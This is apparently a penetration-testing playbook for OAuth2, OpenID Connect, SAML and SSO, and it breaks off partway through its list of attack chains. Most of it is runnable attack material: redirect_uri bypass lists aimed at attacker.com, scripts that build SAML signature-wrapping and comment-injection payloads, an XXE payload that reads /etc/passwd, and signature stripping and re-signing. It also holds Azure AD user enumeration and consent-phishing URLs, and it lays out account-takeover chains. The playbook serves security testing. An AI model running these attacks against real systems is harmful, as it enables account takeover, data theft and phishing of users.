# Playbook: OAuth2, OpenID Connect, SAML & SSO Testing

## Purpose
Systematically test OAuth2, OpenID Connect (OIDC), SAML, and Single Sign-On
implementations for authentication bypass, token theft, and account takeover.
This is a dedicated deep-dive playbook — separate from auth_bypass_checklist.md
which covers general auth weaknesses.
Input: OAuth/OIDC authorization endpoint, SAML IdP/SP metadata, or SSO login flow.

---

## Step 1 — Identify the SSO/Auth Protocol

```bash
# Detect OAuth/OIDC endpoints
curl -sk "https://TARGET/.well-known/openid-configuration" | python3 -m json.tool
curl -sk "https://TARGET/.well-known/oauth-authorization-server" | python3 -m json.tool

# Check for common OAuth paths
for path in /oauth/authorize /oauth2/authorize /auth/realms/master \
            /connect/authorize /oauth/token /api/oauth/token \
            /oauth2/auth /login/oauth /authorize; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET$path")
  [ "$status" != "404" ] && echo "[$status] $path"
done

# Detect SAML endpoints
for path in /saml/metadata /saml2/metadata /auth/saml/metadata \
            /saml/SSO /saml/acs /saml/login /saml/sso \
            /Shibboleth.sso/Metadata /adfs/ls /simplesaml/module.php/core/frontpage_welcome.php; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET$path")
  [ "$status" != "404" ] && echo "[$status] $path"
done

# Check login page source for SSO hints
curl -sk "https://TARGET/login" | grep -iE "oauth|openid|saml|sso|cas|adfs|okta|auth0|keycloak|azure"

# Extract client_id from login page or JS
curl -sk "https://TARGET/login" | grep -oE "client_id=[a-zA-Z0-9_-]+"
```

---

## Step 2 — OAuth2: redirect_uri Validation Bypass

The redirect_uri is the most critical parameter. If an attacker controls it,
the authorization code or token is sent to the attacker.

```bash
AUTH_ENDPOINT="https://TARGET/oauth/authorize"
CLIENT_ID="legit_client_id"
LEGIT_REDIRECT="https://app.target.com/callback"
ATTACKER="https://attacker.com/steal"

# --- 2a. Direct replacement ---
curl -skL -o /dev/null -w "%{redirect_url}" \
  "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${ATTACKER}&response_type=code&scope=openid"

# --- 2b. Subdirectory traversal ---
BYPASSES=(
  "https://app.target.com/callback/../../../attacker.com"
  "https://app.target.com/callback/..%2f..%2fattacker.com"
  "https://app.target.com/callback%2f..%2f..%2f..%2fattacker.com"
)

# --- 2c. Subdomain trust ---
BYPASSES+=(
  "https://evil.app.target.com/callback"
  "https://app.target.com.attacker.com/callback"
  "https://attacker.com?@app.target.com/callback"
  "https://attacker.com#@app.target.com/callback"
  "https://attacker.com\.app.target.com/callback"
)

# --- 2d. URL encoding tricks ---
BYPASSES+=(
  "https://app.target.com%40attacker.com/callback"
  "https://app.target.com%23@attacker.com/callback"
  "https://app.target.com%2540attacker.com"
  "https://attacker.com/%23/callback"
)

# --- 2e. Parameter pollution ---
BYPASSES+=(
  "https://app.target.com/callback&redirect_uri=https://attacker.com/steal"
  "https://app.target.com/callback?next=https://attacker.com/steal"
  "https://app.target.com/callback%23https://attacker.com/steal"
)

# --- 2f. Localhost / internal ---
BYPASSES+=(
  "http://localhost/callback"
  "http://127.0.0.1/callback"
  "http://[::1]/callback"
)

# --- 2g. Scheme variations ---
BYPASSES+=(
  "javascript://app.target.com/%0aalert(1)"
  "data://app.target.com/callback"
  "https:///attacker.com"
)

# Test all bypasses
for uri in "${BYPASSES[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$uri', safe=''))")
  location=$(curl -sk -o /dev/null -w "%{redirect_url}" \
    "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${encoded}&response_type=code&scope=openid")
  echo "redirect_uri=$uri"
  echo "  -> Location: $location"
  echo ""
done

# --- 2h. If exact match is enforced, look for open redirects on allowed domain ---
# Find open redirects on app.target.com, then chain:
#   redirect_uri=https://app.target.com/redirect?url=https://attacker.com
# This is the most common real-world bypass.
curl -sk "https://app.target.com/redirect?url=https://attacker.com" \
  -o /dev/null -w "%{redirect_url}"
```

---

## Step 3 — OAuth2: State Parameter & CSRF

```bash
AUTH_ENDPOINT="https://TARGET/oauth/authorize"
CLIENT_ID="legit_client_id"
REDIRECT="https://app.target.com/callback"

# Test 1: Is state parameter required?
curl -skI "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}&response_type=code&scope=openid"
# If no error without state → CSRF on OAuth login (attacker links their account to victim)

# Test 2: Is state validated on callback?
# Initiate flow, get a code, then submit callback with wrong/empty state:
curl -sk "https://app.target.com/callback?code=AUTH_CODE&state=INVALID_STATE" \
  -o /dev/null -w "%{http_code}"
# If 200/302 to dashboard → state not validated

# Test 3: State reuse
# Use same state parameter across multiple requests — should be rejected after first use

# Test 4: Predictable state
# Collect multiple state values, check for patterns
for i in $(seq 5); do
  curl -skI "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}&response_type=code&scope=openid" \
    | grep -i "location" | grep -oE "state=[^&]+" | cut -d= -f2
done
# If sequential, timestamp-based, or short → predictable state
```

**CSRF-on-OAuth attack flow:**
1. Attacker initiates OAuth with their own IdP account
2. Intercepts the callback URL containing the authorization code
3. Crafts a page that forces the victim to complete the callback
4. Victim's account is now linked to attacker's IdP identity
5. Attacker logs in via SSO and gets access to victim's account

---

## Step 4 — OAuth2: PKCE Downgrade Attacks

```bash
AUTH_ENDPOINT="https://TARGET/oauth/authorize"
TOKEN_ENDPOINT="https://TARGET/oauth/token"
CLIENT_ID="legit_client_id"
REDIRECT="https://app.target.com/callback"

# Test 1: Does the server require PKCE (code_challenge)?
curl -skI "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}&response_type=code&scope=openid"
# If no error without code_challenge → PKCE not enforced (bad for public clients)

# Test 2: Downgrade from S256 to plain
# If PKCE is used with S256, try submitting code_challenge_method=plain
CODE_VERIFIER="test_verifier_string_at_least_43_chars_long_for_pkce"
curl -sk "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}\
&response_type=code&scope=openid\
&code_challenge=${CODE_VERIFIER}\
&code_challenge_method=plain"
# If accepted → attacker who steals the code can use the plain verifier directly

# Test 3: Token exchange without code_verifier
# After getting an auth code, try exchanging without providing code_verifier
curl -sk -X POST "${TOKEN_ENDPOINT}" \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_AUTH_CODE" \
  -d "client_id=${CLIENT_ID}" \
  -d "redirect_uri=${REDIRECT}"
# If token returned → PKCE not enforced at token endpoint
```

---

## Step 5 — OAuth2: Scope Escalation

```bash
AUTH_ENDPOINT="https://TARGET/oauth/authorize"
TOKEN_ENDPOINT="https://TARGET/oauth/token"
CLIENT_ID="legit_client_id"

# Test 1: Request scopes beyond what the app registered for
curl -skI "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}\
&response_type=code&scope=openid+profile+email+admin+write+read:org"

# Test 2: Add scopes during token refresh
REFRESH_TOKEN="existing_refresh_token"
curl -sk -X POST "${TOKEN_ENDPOINT}" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=${REFRESH_TOKEN}" \
  -d "client_id=${CLIENT_ID}" \
  -d "scope=openid profile email admin"
# If new access_token has elevated scopes → scope escalation via refresh

# Test 3: Scope parameter injection
curl -skI "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}\
&response_type=code&scope=openid&scope=admin"
# Double scope parameter — check which one wins

# Inspect token scopes
ACCESS_TOKEN="your_access_token"
curl -sk "https://TARGET/oauth/introspect" \
  -d "token=${ACCESS_TOKEN}" \
  -d "client_id=${CLIENT_ID}" | python3 -m json.tool
```

---

## Step 6 — OAuth2: Token Leakage

```bash
# --- 6a. Implicit flow token in URL fragment ---
# If response_type=token is supported, access_token is in the URL fragment
curl -skI "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}\
&response_type=token&scope=openid"
# Token in fragment (#access_token=...) can be stolen via:
#   - Referrer header to external resources on the callback page
#   - Browser history
#   - XSS on the callback domain

# --- 6b. response_type mixing ---
# Try response_type=code+token or response_type=token+id_token
curl -skI "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}\
&response_type=code%20token&scope=openid"

# --- 6c. Token in server logs via query parameter ---
# Some implementations pass tokens as query params instead of fragments
curl -skI "${AUTH_ENDPOINT}?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT}\
&response_type=token&response_mode=query&scope=openid"
# response_mode=query puts the token in ?access_token= instead of #access_token=
# This means the token hits server logs, proxy logs, Referer headers

# --- 6d. Referer leakage check ---
# If the callback page loads external images/scripts, the full URL
# (including fragment for some browsers, or query params) leaks via Referer
curl -sk "https://app.target.com/callback" | grep -iE "src=.http|href=.http" | head -20

# --- 6e. Token in error messages ---
curl -sk "https://TARGET/api/resource" \
  -H "Authorization: Bearer invalid_token" 2>&1 | grep -i "token"
```

---

## Step 7 — OAuth2: Client Secret Exposure

```bash
# Check if client_secret is exposed in client-side code (SPA/mobile)
curl -sk "https://TARGET/login" | grep -iE "client_secret|clientSecret"

# Check JS bundles
for jsfile in $(curl -sk "https://TARGET/" | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//'); do
  curl -sk "https://TARGET/$jsfile" | grep -iE "client_secret|clientSecret|api_secret" \
    && echo "  [FOUND IN] $jsfile"
done

# Check mobile app configs (if APK/IPA available)
# unzip app.apk -d app_extracted
# grep -r "client_secret\|clientSecret\|api_key" app_extracted/

# Check if token endpoint accepts requests without client_secret (public client)
curl -sk -X POST "${TOKEN_ENDPOINT}" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=${CLIENT_ID}" \
  -d "redirect_uri=${REDIRECT}"
# If this works without client_secret → public client (expected for SPA/mobile, bad for server apps)
```

---

## Step 8 — OAuth2: Account Linking Abuse

```bash
# This attack links an attacker's OAuth identity to a victim's existing account.

# Attack scenario 1: Missing state in account linking flow
# 1. Victim is logged into target.com
# 2. Attacker starts "Link Google Account" flow on target.com
# 3. Attacker authorizes their own Google account
# 4. Attacker intercepts the callback URL: /link/google?code=ATTACKER_CODE
# 5. Attacker sends this URL to victim (CSRF — no state check)
# 6. Victim's browser completes the link — attacker's Google is now linked to victim's account
# 7. Attacker logs in via "Login with Google" and accesses victim's account

# Test: Check if linking flow has CSRF protection
curl -skI "https://TARGET/auth/link/google" | grep -i "location"
# Look for state parameter in the redirect

# Attack scenario 2: Account unlinking without re-authentication
curl -sk -X POST "https://TARGET/api/account/unlink" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d '{"provider": "google"}'
# If no password/re-auth required → attacker with XSS/CSRF can unlink victim's SSO
# Then link attacker's own SSO identity

# Attack scenario 3: Race condition in linking
# Two users simultaneously try to link the same OAuth identity
# Does the system properly prevent duplicate links?
```

---

## Step 9 — OpenID Connect Specific

```bash
# --- 9a. Discovery endpoint information disclosure ---
OIDC_CONFIG=$(curl -sk "https://TARGET/.well-known/openid-configuration")
echo "$OIDC_CONFIG" | python3 -m json.tool

# Extract all endpoints
echo "$OIDC_CONFIG" | python3 -c "
import json, sys
config = json.load(sys.stdin)
for key in sorted(config):
    if 'endpoint' in key.lower() or 'uri' in key.lower() or 'url' in key.lower():
        print(f'  {key}: {config[key]}')
print()
print('Supported grants:', config.get('grant_types_supported', 'N/A'))
print('Supported scopes:', config.get('scopes_supported', 'N/A'))
print('Response types:', config.get('response_types_supported', 'N/A'))
print('Token auth methods:', config.get('token_endpoint_auth_methods_supported', 'N/A'))
print('JWKS URI:', config.get('jwks_uri', 'N/A'))
print('Issuer:', config.get('issuer', 'N/A'))
"

# --- 9b. JWK Set URI manipulation ---
JWKS_URI=$(echo "$OIDC_CONFIG" | python3 -c "import json,sys; print(json.load(sys.stdin).get('jwks_uri',''))")
curl -sk "$JWKS_URI" | python3 -m json.tool

# Check if JWKS URI is on a different domain (potential takeover)
# If the JWKS host is a CNAME to a deregistered service → attacker controls signing keys

# --- 9c. ID token validation ---
# Decode the id_token
ID_TOKEN="eyJhbGci..."
echo "$ID_TOKEN" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
for i, p in enumerate(parts[:2]):
    padded = p + '=' * (-len(p) % 4)
    data = json.loads(base64.urlsafe_b64decode(padded))
    print(f'Part {i+1}:', json.dumps(data, indent=2))
"
# Check: iss matches expected issuer? aud matches client_id? exp is in the future?
# If server does not validate these → token from another app/IdP can be replayed

# --- 9d. Nonce replay ---
# 1. Capture a valid id_token with a nonce
# 2. Replay the same id_token to the callback
# If accepted → nonce not being validated (replay attack)
curl -sk "https://app.target.com/callback" \
  -d "id_token=${ID_TOKEN}&state=VALID_STATE"
# Try submitting the same id_token again — should be rejected

# --- 9e. Issuer validation bypass ---
# Forge an id_token with a different issuer, sign with your own key
# If the relying party fetches .well-known/openid-configuration from the attacker's issuer
# and uses the attacker's JWKS to validate → full token forgery
python3 -c "
# Conceptual: generate a token with iss=https://attacker.com
# Host .well-known/openid-configuration on attacker.com with your JWKS
# If the RP dynamically resolves the issuer → game over
print('Test: Submit id_token with iss=https://attacker.com/.well-known/openid-configuration')
print('If RP fetches your JWKS and validates successfully -> issuer confusion')
"
```

---

## Step 10 — SAML: XML Signature Wrapping (XSW)

XML Signature Wrapping is the most impactful SAML attack class. The signature
covers one XML element, but the application processes a different (attacker-injected) one.

```
XSW Variant Summary (8 classic variants):

XSW1: Clone the Signature, place the cloned original Response as a child of the new
      (unsigned) Response. Signature still validates against the cloned element.

XSW2: Detach the Signature from the Response and append an evil assertion before
      the original (signed) one.

XSW3: Insert an evil Assertion before the existing Assertion. The Signature
      references the original via ID but the SP processes the first Assertion.

XSW4: Similar to XSW3 but the evil Assertion wraps the original.

XSW5: Modify the signed Assertion's value, move the original Assertion into
      the Signature's Object element.

XSW6: Insert evil Assertion, move original into Signature's Object, modify
      the signed assertion content.

XSW7: Add an Extensions element containing the evil Assertion.

XSW8: Move the original Assertion into a nested Object inside the Signature,
      place an evil Assertion at the top level.
```

```bash
# Tool: SAMLRaider (Burp Suite extension) — automates all 8 XSW variants
# Manual test workflow:

# 1. Intercept a valid SAML Response (base64 encoded)
SAML_RESPONSE_B64="PHNhbWxwOlJlc3Bvbn..."
echo "$SAML_RESPONSE_B64" | base64 -d > saml_response.xml

# 2. Inspect the response
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('saml_response.xml')
root = tree.getroot()
ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
      'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol'}
for assertion in root.findall('.//saml:Assertion', ns):
    nameid = assertion.find('.//saml:NameID', ns)
    if nameid is not None:
        print(f'NameID: {nameid.text}')
    for attr in assertion.findall('.//saml:Attribute', ns):
        vals = [v.text for v in attr.findall('saml:AttributeValue', ns)]
        print(f'Attribute {attr.get(\"Name\")}: {vals}')
"

# 3. XSW3 manual example: inject evil assertion before the signed one
python3 << 'PYEOF'
import xml.etree.ElementTree as ET

ET.register_namespace('saml', 'urn:oasis:names:tc:SAML:2.0:assertion')
ET.register_namespace('samlp', 'urn:oasis:names:tc:SAML:2.0:protocol')

tree = ET.parse('saml_response.xml')
root = tree.getroot()
ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

# Find the original assertion
original = root.find('.//saml:Assertion', ns)

# Create evil assertion (clone and modify NameID)
import copy
evil = copy.deepcopy(original)
evil_nameid = evil.find('.//saml:NameID', ns)
if evil_nameid is not None:
    evil_nameid.text = 'admin@target.com'  # target victim
evil.set('ID', '_evil_assertion_id')

# Insert evil assertion before the original
parent = root
idx = list(parent).index(original)
parent.insert(idx, evil)

tree.write('saml_xsw3.xml', xml_declaration=True, encoding='UTF-8')
print('[+] XSW3 payload written to saml_xsw3.xml')
PYEOF

# 4. Base64 encode and submit
cat saml_xsw3.xml | base64 -w0 > saml_xsw3_b64.txt
curl -sk -X POST "https://TARGET/saml/acs" \
  -d "SAMLResponse=$(cat saml_xsw3_b64.txt)"
```

---

## Step 11 — SAML: NameID & Comment Injection

```bash
# --- 11a. NameID spoofing (direct manipulation) ---
# If signature is not validated or XSW works:
# Change <NameID>user@target.com</NameID> to <NameID>admin@target.com</NameID>

# --- 11b. Comment injection (CVE-2017-11427 style) ---
# Many XML parsers handle comments differently.
# If NameID is "attacker@target.com", inject:
#   <NameID>admin@target.com<!---->.attacker.com</NameID>
# Some parsers read "admin@target.com" (ignoring comment and everything after)
# The signature covers the full string including the comment, so it validates.

python3 << 'PYEOF'
import xml.etree.ElementTree as ET

tree = ET.parse('saml_response.xml')
root = tree.getroot()
ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

nameid = root.find('.//saml:NameID', ns)
if nameid is not None:
    original_value = nameid.text
    # Inject comment: parser may truncate at the comment
    # This requires raw XML manipulation since ET strips comments
    print(f'Original NameID: {original_value}')
    print(f'Payload NameID:  admin@target.com<!---->.{original_value}')
    print('If SP truncates at comment -> authenticates as admin@target.com')
PYEOF

# Manual XML edit for comment injection (use sed since ET strips comments):
# sed 's|<NameID[^>]*>[^<]*</NameID>|<NameID>admin@target.com<!---->.attacker.com</NameID>|' \
#   saml_response.xml > saml_comment_inject.xml
```

---

## Step 12 — SAML: Parser Differential Attacks

```bash
# CVE-2025-25291 / CVE-2025-25292 (ruby-saml) — parser differential
# The signature verification uses one XML parser (REXML) and the assertion
# extraction uses another (Nokogiri). If they disagree on which element is
# the assertion, an attacker can craft a response where:
#   - Parser A (signature check) sees the original signed assertion
#   - Parser B (identity extraction) sees the attacker's injected assertion
# This bypasses signature validation entirely.

# Detection: check if target uses ruby-saml
curl -sk "https://TARGET/" -I | grep -iE "x-powered-by|server"
# If Rails/Ruby → likely ruby-saml or omniauth-saml

# The attack requires:
# 1. A single valid signed SAML response (even your own)
# 2. Knowledge of the target's entityID / NameID format
# Craft divergent XML that two parsers interpret differently

# Similar differential attacks exist for other libraries:
# - lasso (C library)
# - python3-saml
# - Spring Security SAML
# Check library version and cross-reference CVE databases

# --- XXE via SAML ---
# SAML requests/responses are XML — test for XXE
python3 << 'PYEOF'
xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_xxe_test" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
  <saml:Issuer>&xxe;</saml:Issuer>
  <saml:Assertion ID="_assertion" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
import base64
print(base64.b64encode(xxe_payload.encode()).decode())
PYEOF

# Submit the XXE SAML response
# curl -sk -X POST "https://TARGET/saml/acs" -d "SAMLResponse=BASE64_XXE_PAYLOAD"

# Also test XXE in SAMLRequest (SP-initiated flow)
# The SAMLRequest is often deflated + base64 encoded
```

---

## Step 13 — SAML: Replay & Timing Attacks

```bash
# --- 13a. Replay attack ---
# Capture a valid SAML Response and replay it
SAML_B64="captured_saml_response_base64"

# Submit immediately
curl -sk -X POST "https://TARGET/saml/acs" \
  -d "SAMLResponse=${SAML_B64}&RelayState=ORIGINAL_RELAY"
# Submit again — should fail if InResponseTo / one-time-use is enforced
curl -sk -X POST "https://TARGET/saml/acs" \
  -d "SAMLResponse=${SAML_B64}&RelayState=ORIGINAL_RELAY"
# If second request succeeds -> replay vulnerability

# --- 13b. NotOnOrAfter bypass ---
# Check if the SP enforces the NotOnOrAfter condition
# Wait until after the assertion's NotOnOrAfter timestamp, then replay
# If accepted -> time condition not enforced

# --- 13c. InResponseTo validation ---
# Submit a valid SAML Response without initiating an SP request first (unsolicited)
# This tests if the SP accepts IdP-initiated responses
curl -sk -X POST "https://TARGET/saml/acs" \
  -d "SAMLResponse=${SAML_B64}"
# If accepted -> SP allows unsolicited responses (IdP-initiated flow)
# This significantly increases attack surface

# --- 13d. Assertion Consumer Service URL manipulation ---
# Change the Destination in the SAML Response to a different ACS URL
# or submit the response to a different ACS endpoint than intended
# Some SPs have multiple ACS URLs and don't validate Destination properly
```

---

## Step 14 — SAML: Certificate & Signature Bypass

```bash
# --- 14a. Missing signature check ---
# Remove the <ds:Signature> element entirely from the SAML Response
python3 << 'PYEOF'
import xml.etree.ElementTree as ET

ET.register_namespace('', 'urn:oasis:names:tc:SAML:2.0:protocol')
ET.register_namespace('saml', 'urn:oasis:names:tc:SAML:2.0:assertion')
ET.register_namespace('ds', 'http://www.w3.org/2000/09/xmldsig#')

tree = ET.parse('saml_response.xml')
root = tree.getroot()

# Remove all Signature elements
for sig in root.findall('.//{http://www.w3.org/2000/09/xmldsig#}Signature'):
    parent = root.find('.//{http://www.w3.org/2000/09/xmldsig#}Signature/..')
    if parent is None:
        parent = root
    parent.remove(sig)

tree.write('saml_no_sig.xml', xml_declaration=True, encoding='UTF-8')
print('[+] Signature removed -> saml_no_sig.xml')
PYEOF

# --- 14b. Self-signed certificate ---
# Generate a new key pair and re-sign the SAML Response with it
openssl req -x509 -newkey rsa:2048 -keyout evil_key.pem -out evil_cert.pem \
  -days 365 -nodes -subj "/CN=EvilIdP"

# Use xmlsec1 to sign with the evil key
# xmlsec1 --sign --privkey-pem evil_key.pem,evil_cert.pem \
#   --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion \
#   saml_modified.xml > saml_evil_signed.xml

# --- 14c. Certificate confusion ---
# If the SP uses the certificate embedded in the SAML Response (KeyInfo)
# instead of a pre-configured IdP certificate -> attacker can sign with any cert
# Test: sign with evil_key.pem, embed evil_cert.pem in KeyInfo, submit
```

---

## Step 15 — SSO: IdP-Initiated vs SP-Initiated Abuse

```bash
# --- 15a. IdP-initiated flow risks ---
# IdP-initiated SSO skips the AuthnRequest, so:
#   - No InResponseTo to validate
#   - No state/nonce to prevent CSRF
#   - Replay window is larger
# Check if target accepts unsolicited SAML Responses (see Step 13c)

# --- 15b. Cross-tenant access ---
# For multi-tenant SaaS with SSO:
TENANT_ID="victim_tenant"

# Try accessing another tenant's SSO endpoint
curl -skI "https://TARGET/auth/saml/${TENANT_ID}/acs"
curl -skI "https://TARGET/auth/${TENANT_ID}/callback"

# Manipulate tenant identifier in SAML Response
# Change Audience / Recipient to a different tenant
# If accepted -> cross-tenant authentication bypass

# Try tenant ID in various locations
curl -skI "https://TARGET/api/v1/org/VICTIM_ORG_ID/sso/saml"
curl -skI "https://${TENANT_ID}.target.com/saml/acs"

# --- 15c. SSO logout bypass ---
# Test if logging out of the IdP also terminates the SP session
# 1. Login via SSO
# 2. Note the SP session cookie
# 3. Logout from the IdP
# 4. Try accessing the SP with the old session cookie
curl -sk "https://TARGET/dashboard" \
  -H "Cookie: session=OLD_SESSION_AFTER_IDP_LOGOUT" \
  -o /dev/null -w "%{http_code}"
# If 200 -> SP session not invalidated on IdP logout (SLO failure)

# Also test: does SP-initiated logout notify the IdP?
# Can you still use the IdP session after SP logout?
```

---

## Step 16 — SSO: Magic Link & Passwordless Auth Bypass

```bash
# --- 16a. Magic link token predictability ---
# Request multiple magic links and analyze the tokens
for i in $(seq 5); do
  curl -sk -X POST "https://TARGET/auth/magic-link" \
    -H "Content-Type: application/json" \
    -d '{"email": "test@yourdomain.com"}'
  sleep 1
done
# Check email for the links, extract tokens, look for patterns
# - Sequential? Timestamp-based? Short? UUIDv1 (contains MAC+time)?

# --- 16b. Magic link reuse ---
TOKEN="received_magic_link_token"
# Use it once
curl -sk "https://TARGET/auth/verify?token=${TOKEN}" -o /dev/null -w "%{http_code}"
# Try using it again
curl -sk "https://TARGET/auth/verify?token=${TOKEN}" -o /dev/null -w "%{http_code}"
# If second request succeeds -> token not invalidated

# --- 16c. Magic link for different user ---
# Request magic link for victim, but with host header manipulation
curl -sk -X POST "https://TARGET/auth/magic-link" \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}'
# If the magic link in the email uses attacker.com -> token theft

# --- 16d. Email parameter pollution ---
curl -sk -X POST "https://TARGET/auth/magic-link" \
  -H "Content-Type: application/json" \
  -d '{"email": ["victim@target.com", "attacker@evil.com"]}'
# Or:
curl -sk -X POST "https://TARGET/auth/magic-link" \
  -d "email=victim@target.com&email=attacker@evil.com"
# Does it send the link to both addresses?
```

---

## Step 17 — Azure AD / Entra ID Specific

```bash
# --- 17a. ROPC flow (Resource Owner Password Credentials) ---
# If enabled, allows direct username/password auth — no MFA, no conditional access
AZURE_TENANT="tenant-id-or-domain.com"
curl -sk -X POST "https://login.microsoftonline.com/${AZURE_TENANT}/oauth2/v2.0/token" \
  -d "client_id=CLIENT_ID" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "username=user@target.com" \
  -d "password=Password123" \
  -d "grant_type=password"
# If this works -> ROPC enabled, MFA bypass possible

# --- 17b. User enumeration via error codes ---
# Azure AD returns different errors for valid vs invalid users
curl -sk -X POST "https://login.microsoftonline.com/${AZURE_TENANT}/oauth2/v2.0/token" \
  -d "client_id=CLIENT_ID" \
  -d "grant_type=password" \
  -d "username=nonexistent@target.com" \
  -d "password=WrongPass123" \
  -d "scope=openid"
# AADSTS50034 = user does not exist
# AADSTS50126 = user exists, wrong password
# AADSTS50053 = account locked
# AADSTS50057 = account disabled

# Bulk enumeration
while read email; do
  response=$(curl -sk -X POST \
    "https://login.microsoftonline.com/${AZURE_TENANT}/oauth2/v2.0/token" \
    -d "client_id=CLIENT_ID&grant_type=password&username=${email}&password=x&scope=openid")
  error=$(echo "$response" | python3 -c "import json,sys; print(json.load(sys.stdin).get('error_description','')[:20])")
  echo "${email}: ${error}"
done < email_list.txt

# --- 17c. Tenant discovery ---
curl -sk "https://login.microsoftonline.com/${AZURE_TENANT}/.well-known/openid-configuration" \
  | python3 -m json.tool

# Check if tenant exists
curl -sk "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&json=1" \
  | python3 -m json.tool

# --- 17d. Conditional access bypass ---
# Try accessing from different:
# - User agents (mobile vs desktop)
# - IP ranges (VPN to different geolocations)
# - Client IDs (use a different app registration)
# - Device compliance states
# If conditional access is IP-based only, VPN may bypass it

# --- 17e. App consent phishing (illicit consent grant) ---
# Craft an OAuth authorization URL that requests high-privilege scopes
# from an Azure AD user:
echo "https://login.microsoftonline.com/${AZURE_TENANT}/oauth2/v2.0/authorize?\
client_id=ATTACKER_APP_ID&\
response_type=code&\
redirect_uri=https://attacker.com/callback&\
scope=User.Read Mail.Read Files.ReadWrite.All&\
response_mode=query"
# If user consents -> attacker app can read their mail, files, etc.
```

---

## Step 18 — Google Workspace Specific

```bash
# --- 18a. OAuth consent screen abuse ---
# Google allows apps to request sensitive scopes. Check what scopes are available:
# - https://www.googleapis.com/auth/gmail.readonly (read email)
# - https://www.googleapis.com/auth/drive (full drive access)
# - https://www.googleapis.com/auth/admin.directory.user (admin SDK)

# If the target's Google Workspace allows external apps:
# Craft consent URL with sensitive scopes
echo "https://accounts.google.com/o/oauth2/v2/auth?\
client_id=ATTACKER_CLIENT_ID&\
redirect_uri=https://attacker.com/callback&\
response_type=code&\
scope=https://www.googleapis.com/auth/gmail.readonly%20https://www.googleapis.com/auth/drive&\
access_type=offline&\
prompt=consent"
# access_type=offline gives a refresh_token (persistent access)

# --- 18b. Service account key exposure ---
# Search for exposed service account JSON keys
# These are often in repos, config files, CI/CD
# Format: {"type": "service_account", "project_id": "...", "private_key": "..."}

# Check if service account has domain-wide delegation
# If yes -> it can impersonate any user in the domain
# This is a CRITICAL finding

# --- 18c. Google Groups misconfiguration ---
# Check if Google Groups are publicly accessible
curl -sk "https://groups.google.com/a/target.com/forum/" -o /dev/null -w "%{http_code}"
# Internal groups exposed publicly can leak sensitive information
```

---

## Step 19 — Account Takeover Attack Chains

### Chain 1: OAuth + Open Redirect = Token Theft = ATO

```
Attack flow:
1. Find open redirect on the allowed redirect_uri domain
   e.g., https://app.target.com/goto?url=https://attacker.com
2. Set redirect_uri to the open redirect:
   /oauth/authorize?client_id=X&redirect_uri=https://app.target.com/goto?url=https://attacker.com&response_type=code
3. Victim clicks the crafted link (via phishing, social engineering)
4. Victim authenticates normally
5. Authorization code is sent to: https://app.target.com/goto?url=https://attacker.com?code=AUTH_CODE
6. Open redirect forwards to attacker with the code
7. Attacker exchanges code for access_token
8. Attacker accesses victim's account

Severity: CRITICAL (P1) — full account takeover with user interaction
```

### Chain 2: SAML Response Manipulation = Admin Access

```
Attack flow:
1. Authenticate normally via SAML to get a valid signed Response
2. Apply XSW attack (Step 10) to inject admin NameID
3. Submit manipulated Response to ACS endpoint
4. SP processes attacker's assertion, grants admin access

Severity: CRITICAL (P1) — admin access without credentials
Prerequisite: XSW vulnerability in SP's SAML library
```

### Chain 3: SSO + Subdomain Takeover = Session Theft

```
Attack flow:
1. Find a dangling CNAME on *.target.com (use subdomain_takeover.md playbook)
2. Claim the subdomain (e.g., abandoned.target.com -> attacker infrastructure)
3. If SSO cookies are set on .target.com (parent domain):
   - Attacker's subdomain can read session cookies
   - Attacker's subdomain can set cookies for .target.com (cookie tossing)
4. If redirect_uri allows *.target.com subdomains:
   - Use the taken-over subdomain as redirect_uri
   - Steal OAuth tokens directly

Severity: CRITICAL (P1) — combines two medium findings into full ATO
```

### Chain 4: CSRF-on-OAuth + Account Linking = ATO

```
Attack flow:
1. Target supports "Login with Google/GitHub/etc."
2. Missing state parameter in OAuth flow (Step 3)
3. Attacker initiates OAuth, intercepts callback with attacker's OAuth identity
4. CSRF forces victim to complete the callback (linking attacker's identity)
